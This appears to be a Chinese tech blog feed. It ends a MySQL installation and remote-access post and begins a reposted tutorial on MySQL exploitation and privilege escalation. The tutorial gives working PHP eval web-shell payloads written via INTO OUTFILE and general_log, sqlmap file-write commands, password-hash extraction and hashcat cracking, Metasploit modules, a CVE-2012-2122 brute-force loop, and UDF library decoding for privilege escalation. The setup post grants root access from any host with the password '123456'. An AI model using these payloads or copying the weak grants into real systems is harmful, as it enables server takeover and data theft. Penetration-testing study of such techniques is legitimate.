class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=MySQL Server</span><br><span class="line">After=network.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/bin/mysqld --defaults-file=/etc/mysql/my.cnf --datadir=/var/lib/mysql --socket=/var/run/mysqld/mysqld.sock User=mysql</span><br><span class="line">Group=mysql</span><br><span class="line">WorkingDirectory=/usr</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>然后运行：</p><p><code>systemctl daemon-reload</code></p><p>使用重启命令：</p><p><code>systemctl start mysql.service</code></p><h3 id="初始化MySQL"><a href="#初始化MySQL" class="headerlink" title="初始化MySQL"></a>初始化MySQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><p>设置root用户&amp;移除匿名用户</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010163931661.png" alt="image-20211010163931661"></p><p>root远程登录数据库&amp;&amp;移除测试数据库&amp;&amp;重新载入权限表</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010164155395.png" alt="image-20211010164155395"></p><h3 id="允许远程访问"><a href="#允许远程访问" class="headerlink" title="允许远程访问"></a>允许远程访问</h3><h4 id="方法一：改表"><a href="#方法一：改表" class="headerlink" title="方法一：改表"></a>方法一：改表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><blockquote><p>在执行update命令的时候报以下错误</p></blockquote><mark class="hl-label red">报错</mark>   <p><code>ERROR 1062 (23000): Duplicate entry &#39;%-root&#39; for key &#39;PRIMARY&#39;</code></p><p>说明有多个ROOT用户纪录在USER表中，查看一下host是否已经有了%这个值，有就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host, user from user;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010170157216.png" alt="image-20211010170157216"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010170350732.png" alt="image-20211010170350732"></p><blockquote><p>使用Navicat连接数据库的时候报这个错误说明需要授权</p></blockquote><h4 id="方法二：授权"><a href="#方法二：授权" class="headerlink" title="方法二：授权"></a>方法二：授权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><blockquote><p>root使用123456从任何主机连接到mysql服务器</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;test&#x27;@’192.168.201.1’ IDENTIFIED BY &#x27;654321&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><blockquote><p>允许用户test从ip为192.168.201.1的主机连接到mysql服务器，并使用654321作为密码</p></blockquote><p>配置完成后都需要<code>flush privileges;</code>重新载入权限表。</p><h3 id="放开防火墙"><a href="#放开防火墙" class="headerlink" title="放开防火墙"></a>放开防火墙</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=3306/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="验证登录"><a href="#验证登录" class="headerlink" title="验证登录"></a>验证登录</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010170851128.png" alt="image-20211010170851128"></p><h2 id="docker部署MySQL"><a href="#docker部署MySQL" class="headerlink" title="docker部署MySQL"></a>docker部署MySQL</h2><p>1.搜索镜像</p><p><code>docker search mysql</code></p><p>2.拉取镜像</p><p><code>docker pull mysql:5.6</code></p><p>3.创建容器,设置端口映射、目录映射</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/mysql</span><br><span class="line"><span class="built_in">cd</span> ~/mysql</span><br><span class="line"> </span><br><span class="line">docker run -id \</span><br><span class="line">-p 3307:3306 \</span><br><span class="line">--name=c_mysql \</span><br><span class="line">-v <span class="variable">$PWD</span>/conf:/etc/mysql/conf.d \</span><br><span class="line">-v <span class="variable">$PWD</span>/logs:/logs \</span><br><span class="line">-v <span class="variable">$PWD</span>/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=bibitest12121354 \</span><br><span class="line">mysql</span><br></pre></td></tr></table></figure><blockquote><p>参数说明：<br>p 3307:3306将容器3306端口映射到宿主机的3307端口<br>-v $PWD/conf:/etc/mysql/conf.d将主机当前目录下的conf/my.cnf挂载到容器的/etc/mysql/my.cnf配置目录<br>-v $PWD/logs:/logs 将主机当前目录下的logs目录挂载到容器的/logs 日志目录<br>-v $PWD/data:/var/lib/mysql 将主机当前目录下的data目录挂载到容器的/var/lib/mysql 数据目录<br>-e MYSQL_ROOT_PASSWORD=bibitest12121354  初始化root用户的密码</p></blockquote><p>4.查看用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user,plugin,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1598326429755-330322d7-f740-48a5-bca3-670a40b3590c.png" alt="img"></p><h3 id="MySQL8-0登录提示caching-sha2-password问题解决方法"><a href="#MySQL8-0登录提示caching-sha2-password问题解决方法" class="headerlink" title="MySQL8.0登录提示caching_sha2_password问题解决方法"></a>MySQL8.0登录提示caching_sha2_password问题解决方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Authentication plugin <span class="string">&#x27;caching_sha2_password&#x27;</span> cannot be loaded: dlopen(/usr/<span class="built_in">local</span>/mysql/lib/plugin/caching_sha2_password.so, 2): image not found</span><br><span class="line">mysqli_real_connect(): The server requested authentication method unknown to the client [caching_sha2_password]</span><br><span class="line">mysqli_real_connect(): (HY000/2054): The server requested authentication method unknown to the client</span><br></pre></td></tr></table></figure><h4 id="方法1：第一次构建容器-amp-amp-已安装完成后新增用户"><a href="#方法1：第一次构建容器-amp-amp-已安装完成后新增用户" class="headerlink" title="方法1：第一次构建容器&amp;&amp;已安装完成后新增用户"></a>方法1：第一次构建容器&amp;&amp;已安装完成后新增用户</h4><p>配置 <code>mysql.cnf</code>配置默认身份验证插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin = mysql_native_password</span><br></pre></td></tr></table></figure><p>验证是否生效：使用CLI进入MySQL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT Host, User, plugin from user;</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| Host      | User             | plugin                |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| %         | root             | mysql_native_password |</span><br><span class="line">| localhost | mysql.infoschema | caching_sha2_password |</span><br><span class="line">| localhost | mysql.session    | caching_sha2_password |</span><br><span class="line">| localhost | mysql.sys        | caching_sha2_password |</span><br><span class="line">| localhost | root             | mysql_native_password |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><blockquote><p>root用户的身份验证器插件已经变为：<strong>mysql_native_password</strong></p></blockquote><h4 id="方法2：当MySQL-已成功安装完成后"><a href="#方法2：当MySQL-已成功安装完成后" class="headerlink" title="方法2：当MySQL 已成功安装完成后"></a>方法2：当MySQL 已成功安装完成后</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT Host, User, plugin from user;</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| Host      | User             | plugin                |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| %         | root             | caching_sha2_password |</span><br><span class="line">| localhost | mysql.infoschema | caching_sha2_password |</span><br><span class="line">| localhost | mysql.session    | caching_sha2_password |</span><br><span class="line">| localhost | mysql.sys        | caching_sha2_password |</span><br><span class="line">| localhost | root             | caching_sha2_password |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>修改身份验证类型(修改密码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;root&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;123456&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure><p>刷新权限：<code>FLUSH PRIVILEGES;</code></p><p>修改结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT Host, User, plugin from user;</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| Host      | User             | plugin                |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">| %         | root             | mysql_native_password |</span><br><span class="line">| localhost | mysql.infoschema | caching_sha2_password |</span><br><span class="line">| localhost | mysql.session    | caching_sha2_password |</span><br><span class="line">| localhost | mysql.sys        | caching_sha2_password |</span><br><span class="line">| localhost | root             | mysql_native_password |</span><br><span class="line">+-----------+------------------+-----------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL漏洞利用与提权</title>
      <link href="/p/9409b6b3.html"/>
      <url>/p/9409b6b3.html</url>
      
        <content type="html"><![CDATA[<p>以下大部分内容转载自<a href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a></p><h1 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h1><h2 id="数据库操作权限"><a href="#数据库操作权限" class="headerlink" title="数据库操作权限"></a>数据库操作权限</h2><p>提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：</p><ol><li>MySQL 3306 端口弱口令爆破</li><li>sqlmap 注入的 <code>--sql-shell</code> 模式</li><li>网站的数据库配置文件中拿到明文密码信息</li><li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li></ol><h2 id="WebShell权限"><a href="#WebShell权限" class="headerlink" title="WebShell权限"></a>WebShell权限</h2><h3 id="into-oufile写shell"><a href="#into-oufile写shell" class="headerlink" title="into oufile写shell"></a><code>into oufile</code>写shell</h3><p>写入条件：</p><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li><code>load_file()</code> 开启 即 <code>secure_file_priv</code> 无限制</li><li>网站路径有写入权限</li></ul><p>首先基础语法查询是否 <code>secure_file_priv</code> 没有限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>/tmp</td><td>只允许在 /tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><h4 id="查看MySQL版本"><a href="#查看MySQL版本" class="headerlink" title="查看MySQL版本"></a>查看MySQL版本</h4><p>方法一：登录时回显信息</p><p>方法二：<code>select version();</code></p><p>方法三：<code>select @@version;</code></p><p>方法四：<code>mysql -V</code></p><h3 id="sqlmap写shell"><a href="#sqlmap写shell" class="headerlink" title="sqlmap写shell"></a>sqlmap写shell</h3><p>sqlmap更多写shell方法参考</p><p>windows下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> -<span class="operator">-file</span><span class="literal">-write</span>=<span class="string">&#x27;shellpass.php&#x27;</span> -<span class="operator">-file</span><span class="literal">-dest</span>=<span class="string">&quot;D:\\phpstudy_pro\\WWW\\testshell\\shellpass.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010220451833.png" alt="image-20211010220451833"></p><p>linux下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> -<span class="operator">-file</span><span class="literal">-write</span>=<span class="string">&#x27;shellpass.php&#x27;</span> -<span class="operator">-file</span><span class="literal">-dest</span>=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="原生的-SQL-语句来直接写-shell："><a href="#原生的-SQL-语句来直接写-shell：" class="headerlink" title="原生的 SQL 语句来直接写 shell："></a>原生的 SQL 语句来直接写 shell：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;D:\\phpstudy_pro\\WWW\\testshell\\shellpass.php&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010201758722.png" alt="image-20211010201758722"></p><blockquote><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;/var/www/html/shellpass.php&#x27;;</span><br></pre></td></tr></table></figure><h3 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h3><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                           |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                             |</span><br><span class="line">| general_log_file | D:\phpstudy_pro\Extensions\MySQL5.5.29\data\xxxx.log |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">MariaDB [(none)]&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+---------------+</span><br><span class="line">| Variable_name    | Value         |</span><br><span class="line">+------------------+---------------+</span><br><span class="line">| general_log      | OFF           |</span><br><span class="line">| general_log_file | localhost.log |</span><br><span class="line">+------------------+---------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p><p>更改日志文件位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;D:\\phpstudy_pro\\WWW\\testshell\\shellpass.php&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010224712241.png" alt="image-20211010224712241"></p><p>往日志里面写入 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010225346136.png" alt="image-20211010225346136"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010225332031.png" alt="image-20211010225332031"></p><h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line">+-----------+------+-------------------------------------------+</span><br><span class="line">| host      | user | password                                  |</span><br><span class="line">+-----------+------+-------------------------------------------+</span><br><span class="line">| localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| localhost |      |                                           |</span><br><span class="line">+-----------+------+-------------------------------------------+</span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+-----------+---------------+-------------------------------------------+</span><br><span class="line">| host      | user          | authentication_string                     |</span><br><span class="line">+-----------+---------------+-------------------------------------------+</span><br><span class="line">| localhost | root          | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+-----------+---------------+-------------------------------------------+</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010225704301.png" alt="image-20211010225704301"></p><h3 id="使用hashcat"><a href="#使用hashcat" class="headerlink" title="使用hashcat"></a>使用hashcat</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe <span class="literal">-a</span> <span class="number">0</span> <span class="literal">-m</span> <span class="number">300</span> -<span class="literal">-force</span> <span class="string">&#x27;81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&#x27;</span> <span class="string">&#x27;E:\fuzz\test_bp\test_password.txt&#x27;</span> -<span class="literal">-show</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211011095647446.png" alt="image-20211011095647446"></p><h2 id="MySQL漏洞"><a href="#MySQL漏洞" class="headerlink" title="MySQL漏洞"></a>MySQL漏洞</h2><h3 id="yaSSL-缓冲区溢出"><a href="#yaSSL-缓冲区溢出" class="headerlink" title="yaSSL 缓冲区溢出"></a>yaSSL 缓冲区溢出</h3><p>MySQL yaSSL SSL Hello Message Buffer Overflow 缓冲区溢出漏洞  MSF 对应的模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello</span><br><span class="line">msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello</span><br></pre></td></tr></table></figure><blockquote><p><strong>Linux</strong> : MySQL 5.0.45-Debian_1ubuntu3.1-log</p><p><strong>Windows</strong> : MySQL 5.0.45-community-nt</p></blockquote><h3 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h3><p>只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。按照公告说法大约256次就能够蒙对一次。</p><h4 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h4><p>All MariaDB and MySQL versions up to <strong>5.1.61, 5.2.11, 5.3.5, 5.5.22</strong> are vulnerable.<br>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.<br>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</p><p><strong>msf_payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211011111218374.png" alt="image-20211011111218374"></p><p><strong>linux_shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h 192.168.201.1 -P3306 ; done</span><br></pre></td></tr></table></figure><h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><p>自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。</p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p><strong>sqlmap 的 UDF 动态链接库文件位置</strong>：sqlmap根目录<code>/data/udf/mysql</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS E:\web\sqlmap\data\udf\mysql&gt; tree</span><br><span class="line">E:.</span><br><span class="line">├─linux</span><br><span class="line">│  ├─32</span><br><span class="line">│  └─64</span><br><span class="line">└─windows</span><br><span class="line">    ├─32</span><br><span class="line">    └─64</span><br></pre></td></tr></table></figure><blockquote><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具<strong>cloak.py</strong> 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前目录情况</span></span><br><span class="line">➜ pwd</span><br><span class="line">E:\web\sqlmap\extra\cloak</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">➜ python .\cloak.py -d -i &#x27;E:\web\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_&#x27; -o lib_mysqludf_sys_64.dll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前目录下的情况</span></span><br><span class="line">➜ ls</span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure><p><strong>Metasploit 的 UDF 动态链接库文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/exploits/mysql</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020100147961.png" alt="image-20211020100147961"></p><p><a 